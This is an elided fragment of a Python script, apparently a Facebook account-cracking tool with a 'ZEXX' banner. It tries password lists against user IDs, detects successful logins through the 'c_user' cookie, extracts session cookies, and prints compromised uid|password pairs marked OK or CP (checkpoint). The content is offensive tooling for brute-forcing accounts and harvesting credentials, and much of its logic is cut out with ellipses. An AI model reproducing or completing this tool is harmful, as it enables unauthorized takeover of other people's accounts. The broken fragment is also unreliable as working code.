...
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
 {gn}Owner    : {cn}ZEXX{ed}
 {gn}Guthub   : {cn}farhanmallik51{ed}
 {gn}Facebook : {cn}Farhan Mallik{ed}
 {gn}Tools    : {cn}RANK{pn} •{gn}[{cn}version \033[1;42m{rn}•0.1•{ed}{gn}]{ed}
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
# MAIN MANU 
def Main():
        os.system("clear")
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[ZEXX-FIND]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mZEXX-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mZEXX-CP\033[1;33m]\033[1;91m {uid}|{ps}")
